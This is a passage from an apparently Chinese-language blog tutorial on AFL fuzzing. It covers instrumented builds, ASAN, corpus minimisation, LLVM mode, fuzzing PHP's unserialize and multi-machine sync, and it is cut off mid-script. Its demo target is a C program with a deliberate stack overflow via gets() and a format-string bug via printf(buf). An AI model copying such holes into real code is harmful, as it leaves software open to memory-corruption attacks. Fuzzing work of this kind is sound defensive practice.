<span class="meta-string">&lt;stdlib.h&gt;</span> </span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span> </span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span> </span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span> </span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">vuln</span><span class="params">(<span class="keyword">char</span> *str)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> len = <span class="built_in">strlen</span>(str);</div><div class="line">    <span class="keyword">if</span>(str[<span class="number">0</span>] == <span class="string">'A'</span> &amp;&amp; len == <span class="number">66</span>)</div><div class="line">    &#123;</div><div class="line">        raise(SIGSEGV);</div><div class="line">        <span class="comment">//如果输入的字符串的首字符为A并且长度为66，则异常退出</span></div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(str[<span class="number">0</span>] == <span class="string">'F'</span> &amp;&amp; len == <span class="number">6</span>)</div><div class="line">    &#123;</div><div class="line">        raise(SIGSEGV);</div><div class="line">        <span class="comment">//如果输入的字符串的首字符为F并且长度为6，则异常退出</span></div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span></div><div class="line">    &#123;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"it is good!\n"</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">char</span> buf[<span class="number">100</span>]=&#123;<span class="number">0</span>&#125;;</div><div class="line">    gets(buf);<span class="comment">//存在栈溢出漏洞</span></div><div class="line">    <span class="built_in">printf</span>(buf);<span class="comment">//存在格式化字符串漏洞</span></div><div class="line">    vuln(buf);</div><div class="line"></div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>使用afl-gcc进行插桩编译</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">afl-gcc -g -o ./zerotest/vuln ./zerotest/vuln.c</div></pre></td></tr></table></figure><p>PS:<br>如果目标程序中有Makefile，那么分两种情况:</p><ol><li>程序是用autoconf构建，那么此时只需要执行如下即可</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">./configure CC=&quot;afl-gcc&quot; CXX=&quot;afl-g++&quot;</div></pre></td></tr></table></figure><p>此外，还可以执行如下语句设置LD_LIBRARY_PATH让程序加载经过AFL插桩的.so文件，进行静态构建而不是动态链接</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">./configure --disable-shared CC=&quot;afl-gcc&quot; CXX=&quot;afl-g++&quot;</div></pre></td></tr></table></figure><ol><li>程序不是用autoconf构建，那么直接修改Makefile文件中的编译器为<code>afl-gcc/g++</code>。</li></ol><p>为了后期更好的分析crash，在此处可以开启Address Sanitizer(ASAN)这个内存检测工具，此工具可以更好的检测出缓存区溢出、UAF 等内存漏洞，开启方法如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">AFL_USE_ASAN=1 ./configure CC=afl-gcc CXX=afl-g++ LD=afl-gcc--disable-shared</div><div class="line">AFL_USE_ASAN=1 make</div></pre></td></tr></table></figure><p>不使用 AFL 编译插桩时，可使用以下方式开启 Address Sanitizer。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">./configure CC=gcc CXX=g++ CFLAGS=&quot;-g -fsanitize=address&quot;</div><div class="line">make</div></pre></td></tr></table></figure><h4 id="1-2-开始fuzz"><a href="#1-2-开始fuzz" class="headerlink" title="1.2 开始fuzz"></a>1.2 开始fuzz</h4><p>fuzz的语法一般情况是两种:</p><ol><li>直接从stdin读取输入的目标程序</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ ./afl-fuzz -i testcase_dir -o findings_dir /path/to/program […params…]</div></pre></td></tr></table></figure><ol><li>从文件读取输入的目标程序，@@就是占位符，表示输入替换的位置</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ ./afl-fuzz -i testcase_dir -o findings_dir /path/to/program @@</div></pre></td></tr></table></figure><p>此处我采用第一种方式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">afl-fuzz -m 300 -i ./zerotest/fuzz_in -o ./zerotest/fuzz_out ./zerotest/vuln -f</div></pre></td></tr></table></figure><p>PS: 常见参数的含义如下</p><ul><li>-f参数表示：testcase的内容会作为afl_test的stdin</li><li>-m参数表示分配的内存空间</li><li>-i 指定测试样本的路径</li><li>-o 指定输出结果的路径</li><li>/dev/null 使错误信息不输出到屏幕</li><li>-t：设置程序运行超时值，单位为 ms</li><li>-M：运行主(Master) Fuzzer</li><li>-S：运行从属(Slave) Fuzzer</li></ul><h4 id="1-3-fuzz的结果"><a href="#1-3-fuzz的结果" class="headerlink" title="1.3 fuzz的结果"></a>1.3 fuzz的结果</h4><p><img src="https://i.loli.net/2019/05/15/5cdc17c37edfd11335.png" alt="60889809-4D22-4C14-AF3C-E98D2C5EB60D.png"></p><p>从界面上主要注意以下几点:</p><ol><li>last new path 如果报错那么要及时修正命令行参数，不然继续fuzz也是徒劳（因为路径是不会改变的）；</li><li>cycles done 如果变绿就说明后面及时继续fuzz，出现crash的几率也很低了，可以选择在这个时候停止</li><li>uniq crashes 代表的是crash的数量</li></ol><h4 id="1-4-crash分析"><a href="#1-4-crash分析" class="headerlink" title="1.4 crash分析"></a>1.4 crash分析</h4><p>PS: xxd命令的作用就是将一个文件以十六进制的形式显示出来</p><p><img src="https://i.loli.net/2019/05/15/5cdc17e6d731a12930.png" alt="1FF9D91F-F823-4DF7-B716-C68B58134D65.png"></p><p>可以看到已经得到的几个crash文件，那么分析的话只需要将其作为之前vuln文件的输入，使用gdb调试分析就可以得到详细结果了，但是在这之前可以使用xxd看一下其中数据的内容做一个初步的判断。</p><p>分别看一下这几个crash的信息</p><ol><li>可以看到应该是满足了开头是F且字符串长度为6的异常退出情况<br><img src="https://i.loli.net/2019/05/15/5cdc1819e028a13399.png" alt="63005FA6-59BD-48BD-8B19-F5EF08C84D4E.png"></li><li>看这个数据情况可能是栈溢出<br><img src="https://i.loli.net/2019/05/15/5cdc18323104a44582.png" alt="D74734D1-F13E-4256-B47C-260817BE102E.png"></li><li>栈溢出<br><img src="https://i.loli.net/2019/05/15/5cdc1890b95d940410.png" alt="B909DBCF-66FF-4C37-BF39-1ED413A6B0C3.png"></li><li>符合首字符为A且栈溢出<br><img src="https://i.loli.net/2019/05/15/5cdc18a6085c235233.png" alt="8213201E-7B35-45D7-9057-5493978CCABB.png"></li><li>格式化字符串?可能<br><img src="https://i.loli.net/2019/05/15/5cdc18bd9a06782571.png" alt="C7F22A69-F1E6-4863-B9BD-08D88A82C789.png"></li><li>符合首字符为A且字符串长度为66的异常退出情况<br><img src="https://i.loli.net/2019/05/15/5cdc18d239e5642604.png" alt="41BAF060-7874-4D52-93CC-49FD86AF26D3.png"></li></ol><p>主要参考:<br><a href="https://xz.aliyun.com/t/4314" target="_blank" rel="external">《初探Fuzz-AFL》</a></p><h4 id="1-5-语料库蒸馏-Corpus-Distillation"><a href="#1-5-语料库蒸馏-Corpus-Distillation" class="headerlink" title="1.5 语料库蒸馏(Corpus Distillation)"></a>1.5 语料库蒸馏(Corpus Distillation)</h4><p>一般来说在进行fuzz之前构建一份有效的语料库是十分有必要的，这将作为程序开始时的种子。</p><p>语料库的信息来源主要如下:</p><ul><li>使用项目自身提供的测试用例</li><li>目标程序bug提交页面</li><li>使用格式转换器，用从现有的文件格式生成一些不容易找到的文件格式：</li><li>afl源码的testcases目录下提供了一些测试用例</li><li>其他开源的语料库</li></ul><p>收集完后可以使用afl提供的工具来对语料库进行进一步的处理:</p><ol><li>afl-cmin: 移除执行相同代码的输入文件<br>afl-cmin的核心思想是: 尝试找到与语料库全集具有相同覆盖范围的最小子集。<br>它一般的两种执行模式是:</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">afl-cmin -i input_dir -o output_dir -- /path/to/tested/program [params]</div></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">afl-cmin -i input_dir -o output_dir -- /path/to/tested/program [params] @@</div></pre></td></tr></table></figure><ol><li>afl-tmin: 减小单个输入文件的大小<br>它有两种工作模式: instrumented mode和crash mode。默认的工作方式是instrumented mode</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"># instrumented mode</div><div class="line">afl-tmin -i input_file -o output_file -- /path/to/tested/program [params] @@</div></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"># crash mode 将会剔除导致crash的文件</div><div class="line">afl-tmin -x -i input_file -o output_file -- /path/to/tested/program [params] @@</div></pre></td></tr></table></figure><p>由于只能针对单个目标进行使用，因此使用如下shell脚本进行批量处理</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> *; <span class="keyword">do</span> afl-tmin -i <span class="variable">$i</span> -o tmin-<span class="variable">$i</span> -- ~/path/to/tested/program [params] @@; <span class="keyword">done</span>;</div></pre></td></tr></table></figure><p>或者修改如下的Python脚本进行预处理</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> os</div><div class="line"><span class="keyword">import</span> sys</div><div class="line"><span class="keyword">import</span> shutil</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmin</span><span class="params">()</span>:</span></div><div class="line">    command = <span class="string">' -m 300 -t 5000 ./utilities/magick convert @@ /dev/null'</span> </div><div class="line">    os.system(<span class="string">'afl-cmin -i seeds/tmin -o seeds/cmin '</span> + command)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">tmin</span><span class="params">()</span>:</span></div><div class="line">    command = <span class="string">' -m 300 -t 5000 ./utilities/magick convert @@ /dev/null'</span> </div><div class="line">    seed_list = os.listdir(<span class="string">'seeds/all_format'</span>)</div><div class="line">    <span class="keyword">for</span> seed <span class="keyword">in</span> seed_list:</div><div class="line">        in_file = os.path.join(<span class="string">'seeds/all_format'</span>, seed)</div><div class="line">        out_file = os.path.join(<span class="string">'seeds/tmin'</span>, seed)</div><div class="line">        <span class="keyword">if</span> os.path.getsize(in_file) &gt; <span class="number">1024</span>*<span class="number">1</span>:</div><div class="line">            <span class="keyword">if</span> os.path.getsize(in_file) &lt; <span class="number">1024</span>*<span class="number">3</span> <span class="keyword">and</span> <span class="keyword">not</span> seed.endswith(<span class="string">'.txt'</span>):</div><div class="line">                os.system(<span class="string">'afl-tmin -i '</span> + in_file + <span class="string">' -o '</span> + out_file + command)</div><div class="line">                print(<span class="string">'afl-tmin -i '</span> + in_file + <span class="string">' -o '</span> + out_file + command)</div><div class="line">            <span class="keyword">else</span>:</div><div class="line">                <span class="keyword">pass</span></div><div class="line">        <span class="keyword">elif</span> os.path.getsize(in_file) &gt; <span class="number">0</span>:</div><div class="line">            shutil.copyfile(in_file,out_file)</div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            <span class="keyword">pass</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">convert</span><span class="params">(origin_seeds)</span>:</span></div><div class="line">    seed_list = os.listdir(origin_seeds)</div><div class="line">    <span class="keyword">for</span> seed <span class="keyword">in</span> seed_list:</div><div class="line">        seed_in = os.path.join(origin_seeds, seed)</div><div class="line">        file_name = (os.path.splitext(seed)[<span class="number">0</span>])</div><div class="line">        coder_list = os.listdir(<span class="string">'coders'</span>)</div><div class="line">        <span class="keyword">for</span> cfile <span class="keyword">in</span> coder_list:</div><div class="line">            <span class="keyword">if</span> cfile.endswith(<span class="string">'.c'</span>):</div><div class="line">                extern = cfile[:cfile.find(<span class="string">'.c'</span>)]</div><div class="line">                seed_out = <span class="string">'seeds/all_format/'</span> + file_name + <span class="string">'.'</span> + extern</div><div class="line">                os.system(<span class="string">'utilities/magick convert '</span> + seed_in + <span class="string">' '</span> + seed_out)</div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    <span class="keyword">if</span> len(sys.argv) &lt; <span class="number">2</span>:</div><div class="line">        <span class="keyword">print</span> <span class="string">'Usage: '</span> + sys.argv[<span class="number">0</span>] + <span class="string">' origin_seeds_dir'</span></div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        origin_seeds_dir = sys.argv[<span class="number">1</span>]</div><div class="line">        <span class="keyword">try</span>:</div><div class="line">            os.mkdir(<span class="string">'seeds'</span>)</div><div class="line">            seeds_path = os.path.join(os.path.abspath(<span class="string">'.'</span>),<span class="string">'seeds'</span>)</div><div class="line">            os.mkdir(os.path.join(seeds_path,<span class="string">'all_format'</span>))</div><div class="line">            os.mkdir(os.path.join(seeds_path,<span class="string">'cmin'</span>))</div><div class="line">            os.mkdir(os.path.join(seeds_path,<span class="string">'tmin'</span>))</div><div class="line">        <span class="keyword">except</span>:</div><div class="line">            <span class="keyword">print</span> <span class="string">'make dir fail!'</span></div><div class="line">        convert(origin_seeds_dir)</div><div class="line">        tmin()</div><div class="line">        cmin()</div></pre></td></tr></table></figure><p>预处理脚本来自:<a href="http://0x4c43.cn/2018/0722/use-afl-for-fuzz-testing/" target="_blank" rel="external">《使用 AFL 进行模糊测试》</a></p><h3 id="2-LLVM-Mode模式"><a href="#2-LLVM-Mode模式" class="headerlink" title="2. LLVM Mode模式"></a>2. LLVM Mode模式</h3><h4 id="2-1-启用llvm"><a href="#2-1-启用llvm" class="headerlink" title="2.1 启用llvm"></a>2.1 启用llvm</h4><p>LLVM Mode模式编译程序可以获得更快的Fuzzing速度，因此针对大型项目可以考虑启用。</p><p>下载必要的安装包</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">wget http://releases.llvm.org/8.0.0/llvm-8.0.0.src.tar.xz</div><div class="line">wget http://releases.llvm.org/8.0.0/compiler-rt-8.0.0.src.tar.xz</div><div class="line">wget http://releases.llvm.org/8.0.0/clang-tools-extra-8.0.0.src.tar.xz</div><div class="line">wget http://releases.llvm.org/8.0.0/cfe-8.0.0.src.tar.xz</div></pre></td></tr></table></figure><p>解压缩</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">xz -d ./*</div><div class="line">tar xvf cfe-8.0.0.src.tar</div><div class="line">tar xvf clang-tools-extra-8.0.0.src.tar</div><div class="line">tar xvf llvm-8.0.0.src.tar</div><div class="line">tar xvf compiler-rt-8.0.0.src.tar</div></pre></td></tr></table></figure><p>源码合并</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">mv cfe-8.0.0.src clang</div><div class="line">mv clang llvm-8.0.0.src/tools</div><div class="line">mv clang-tools-extra-8.0.0.src extra</div><div class="line">mv extra llvm-8.0.0.src/tools/clang</div><div class="line">mv compiler-rt-8.0.0.src compiler-rt</div><div class="line">mv compiler-rt llvm-8.0.0.src/projects</div></pre></td></tr></table></figure><p>编译安装</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">mkdir build-8.0</div><div class="line">cmake ../llvm-8.0.0.src/</div><div class="line">cmake --build .</div><div class="line">cmake --build . --target install</div><div class="line">cmake -DCMAKE_INSTALL_PREFIX=/tmp/llvm -P cmake_install.cmake</div></pre></td></tr></table></figure><p>上面的编译安装对硬件配置和硬盘的空间要求比较高，所以你可以直接使用源进行安装，比如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">apt install llvm clang</div></pre></td></tr></table></figure><p>编译安装afl的llvm模块<br>(我的使用的是kali linux 2019.1进行编译的，clang版本过高会失败，使用clang++也会失败，所以最终发现下面方法可行)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">cd afl/llvm_mode</div><div class="line">export CXX=/usr/bin/g++</div><div class="line">export CC=/usr/bin/clang-6.0</div><div class="line">make</div></pre></td></tr></table></figure><p>因为clang没有办法使用<code>update-alternatives</code>，因此我直接修改软连接</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">ln -s /usr/bin/clang-6.0 /usr/bin/clang</div><div class="line">ln -sb /usr/bin/clang++-6.0 /usr/bin/clang++</div></pre></td></tr></table></figure><p>之后就可以正常使用afl-clang-fast了<br><img src="https://i.loli.net/2019/05/15/5cdc18ecc0cc062251.png" alt="9B83B620-E1A2-420F-81CA-FC6C4777F4EB.png"></p><p>其实以上均太费劲，还有更简单的方法，kali linux的源中包含了afl，所以可以直接apt进行安装，装好之后afl-clang-fast也就有了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">apt install afl</div></pre></td></tr></table></figure><h4 id="2-2-使用LLVM-Mode模式进行fuzz"><a href="#2-2-使用LLVM-Mode模式进行fuzz" class="headerlink" title="2.2 使用LLVM Mode模式进行fuzz"></a>2.2 使用LLVM Mode模式进行fuzz</h4><p>编译插桩</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">root@kali-z ~/Desktop/fuzz/afl$ ./afl-clang-fast -g -o ./zerotest/vuln-fast ./zerotest/vuln.c</div></pre></td></tr></table></figure><p>之后重复上面的方式进行fuzz即可，接下来展示一个使用此模式fuzz php内核代码的例子。</p><h5 id="1-下载目标代码"><a href="#1-下载目标代码" class="headerlink" title="1. 下载目标代码"></a>1. 下载目标代码</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">wget https://github.com/php/php-src/archive/php-7.2.11.tar.gz &amp;&amp; tar xf php-7.2.11.tar.gz</div></pre></td></tr></table></figure><h5 id="2-进行编译插桩"><a href="#2-进行编译插桩" class="headerlink" title="2. 进行编译插桩"></a>2. 进行编译插桩</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">cd php-src-php-7.2.11</div><div class="line">./buildconf --force</div><div class="line">CC=afl-clang-fast CXX=afl-clang-fast++ ./configure</div><div class="line">AFL_USE_ASAN=1 make</div></pre></td></tr></table></figure><p>PS: 如果报错缺失libconv，则在<code>Makefile</code>中的<code>EXTRA_LIBS =</code>添加<code>-liconv</code></p><h5 id="3-进行源代码的修改"><a href="#3-进行源代码的修改" class="headerlink" title="3. 进行源代码的修改"></a>3. 进行源代码的修改</h5><p>未修改之前  sapi/cli/php_cli.c<br><img src="https://i.loli.net/2019/05/15/5cdc19514eecd50209.png" alt="BB750539-176B-4A52-A437-D370814C7CCE.png"><br>修改之后   sapi/cli/php_cli.c<br><img src="https://i.loli.net/2019/05/15/5cdc1963129fc31389.png" alt="C21FA188-6FFE-440A-B0AD-BA0F8C60312C.png"><br>修改完之后执行如下进行rebuild</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">AFL_USE_ASAN=1 make</div></pre></td></tr></table></figure><p>PS: 之所以进行这样的修改，是因为我们使用<code>php -r</code>来eval php string，因此定位到<code>sapi/cli/php_cli.c</code>进行代码的修改离开提升后期fuzz的效率。</p><h5 id="4-构造一个输入点"><a href="#4-构造一个输入点" class="headerlink" title="4. 构造一个输入点"></a>4. 构造一个输入点</h5><p>我们想在fuzz的时候从stdin进行数据的输入，因此构造如下输入点</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">unserialize(file_get_contents(“php://stdin”));</div></pre></td></tr></table></figure><h5 id="5-根据上述的构造点构造输入数据"><a href="#5-根据上述的构造点构造输入数据" class="headerlink" title="5. 根据上述的构造点构造输入数据"></a>5. 根据上述的构造点构造输入数据</h5><p>此处账户要考虑构造不同类类型的输入数据，构造如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">mkdir serialized_data &amp;&amp; cd serialized_data</div><div class="line">../sapi/cli/php -r &apos;echo serialize(&quot;a&quot;);&apos; &gt; string</div><div class="line">../sapi/cli/php -r &apos;echo serialize(1);&apos; &gt; number</div><div class="line">../sapi/cli/php -r &apos;echo serialize([1,2]);&apos; &gt; array_of_num</div><div class="line">../sapi/cli/php -r &apos;echo serialize([&quot;1&quot;,&quot;2&quot;]);&apos; &gt; array_of_str</div><div class="line">../sapi/cli/php -r &apos;echo serialize([[&quot;1&quot;,&quot;2&quot;],[&quot;3&quot;,&quot;4&quot;],[1,2]]);&apos; &gt; array_of_array</div><div class="line">echo &apos;O:6:&quot;zeroyu&quot;:1:&#123;s:4:&quot;test&quot;;O:7:&quot;npusec2&quot;:1:&#123;s:5:&quot;test2&quot;;s:10:&quot;phpinfo();&quot;;&#125;&#125;&apos; &gt; class</div></pre></td></tr></table></figure><h5 id="6-开始fuzz"><a href="#6-开始fuzz" class="headerlink" title="6. 开始fuzz"></a>6. 开始fuzz</h5><p>为了从地址清理(ASAN)中获得有用的结果，有必要设置一个环境变量，以便PHP禁用其自定义内存分配器，从而使内存安全问题对ASAN可见。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">USE_ZEND_ALLOC=0 screen -S zeroyu</div></pre></td></tr></table></figure><p>使用screen可以随时进入查看fuzz的结果</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">screen -r zeroyu</div></pre></td></tr></table></figure><p>使用如下命令开始fuzz</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">cd..</div><div class="line">afl-fuzz -i serialized_data -o basic_fuzz -m none -- ./sapi/cli/php -r &apos;unserialize(file_get_contents(&quot;php://stdin&quot;));&apos;</div></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/05/15/5cdc197fb417a82164.png" alt="11B4692E-E516-4743-9FAC-B39AB1C03ED0.png"></p><h5 id="7-分析crash"><a href="#7-分析crash" class="headerlink" title="7. 分析crash"></a>7. 分析crash</h5><p>用是使用如下bash脚本来寻找可能是bug的crash，因为有些是良性的crash，是由于ASAN无法分配足够的内存。这是因为ASAN需要额外的内存来跟踪所有分配，而精心编制的序列化对象可能会触发大内存分配。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">for</span> FILE <span class="keyword">in</span> $(ls id*); <span class="keyword">do</span> cat <span class="variable">$FILE</span> | ../../sapi/cli/php -r <span class="string">"unserialize(file_get_contents('php://stdin'));"</span> 2&gt;&amp;1 | grep -E <span class="string">"SUMMARY|ERROR"</span> | grep -v <span class="string">"LargeMmap"</span> &amp;&amp; <span class="built_in">echo</span> <span class="variable">$FILE</span>; <span class="keyword">done</span></div></pre></td></tr></table></figure><p>参考: <a href="https://www.tripwire.com/state-of-security/vert/fuzzing-php-for-fun-and-profit/" target="_blank" rel="external">《Fuzzing PHP for Fun and Profit》</a></p><h3 id="3-黑盒测试"><a href="#3-黑盒测试" class="headerlink" title="3. 黑盒测试"></a>3. 黑盒测试</h3><p>参考：<a href="https://paper.tuisec.win/detail/45e6d0a790d79da" target="_blank" rel="external">《AFL漏洞挖掘技术漫谈（一）：用AFL开始你的第一次Fuzzing》</a></p><h3 id="4-并行测试"><a href="#4-并行测试" class="headerlink" title="4. 并行测试"></a>4. 并行测试</h3><h4 id="4-1-单系统并行"><a href="#4-1-单系统并行" class="headerlink" title="4.1 单系统并行"></a>4.1 单系统并行</h4><p>查看系统核心数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">cat /proc/cpuinfo| grep &quot;cpu cores&quot;| uniq</div></pre></td></tr></table></figure><p>afl-fuzz并行Fuzzing，一般的做法是通过-M参数指定一个主Fuzzer(Master Fuzzer)、通过-S参数指定多个从Fuzzer(Slave Fuzzer)。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$ screen afl-fuzz -i testcases/ -o sync_dir/ -M fuzzer1 -- ./program</div><div class="line">$ screen afl-fuzz -i testcases/ -o sync_dir/ -S fuzzer2 -- ./program</div><div class="line">$ screen afl-fuzz -i testcases/ -o sync_dir/ -S fuzzer3 -- ./program</div></pre></td></tr></table></figure><p>PS: -o指定的是一个同步目录，并行测试中，所有的Fuzzer将相互协作，在找到新的代码路径时，相互传递新的测试用例。所以不用担心重复的问题</p><p>两个辅助工具:</p><ul><li><code>afl-whatsup</code>工具可以查看每个fuzzer的运行状态和总体运行概况，加上-s选项只显示概况，其中的数据都是所有fuzzer的总和。</li><li><code>afl-gotcpu</code>工具可以查看每个核心使用状态。</li></ul><h4 id="4-2-多系统并行"><a href="#4-2-多系统并行" class="headerlink" title="4.2 多系统并行"></a>4.2 多系统并行</h4><p>压缩每个fuzzer实例目录中queue下的文件，通过如下SSH脚本同步分发到其他机器上解压。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#!/bin/sh</span></div><div class="line"></div><div class="line"><span class="comment"># authorized_keys的方式进行ssh认证</span></div><div class="line"><span class="comment"># 所有要同步的主机</span></div><div class="line">FUZZ_HOSTS=<span class="string">'172.21.5.101 172.21.5.102'</span></div><div class="line"><span class="comment"># SSH user</span></div><div class="line">FUZZ_USER=root</div><div class="line"><span class="comment"># 同步目录</span></div><div class="line">SYNC_DIR=<span class="string">'/root/syncdir'</span></div><div class="line"><span class="comment"># 同步间隔时间</span></div><div class="line">SYNC_INTERVAL=$((30 * 60))</div><div class="line"></div><div class="line"><span class="keyword">if</span> [ <span class="string">"<span class="variable">$AFL_ALLOW_TMP</span>"</span> = <span class="string">""</span> ]; <span class="keyword">then</span></div><div class="line">  <span class="keyword">if</span> [ <span class="string">"<span class="variable">$PWD</span>"</span> = <span class="string">"/tmp"</span> -o <span class="string">"<span class="variable">$PWD</span>"</span> = <span class="string">"/var/tmp"</span> ]; <span class="keyword">then</span></div><div class="line">    <span class="built_in">echo</span> <span class="string">"[-] Error: do not use shared /tmp or /var/tmp directories with this script."</span> 1&gt;&amp;2</div><div class="line">    <span class="built_in">exit</span> 1</div><div class="line">  <span 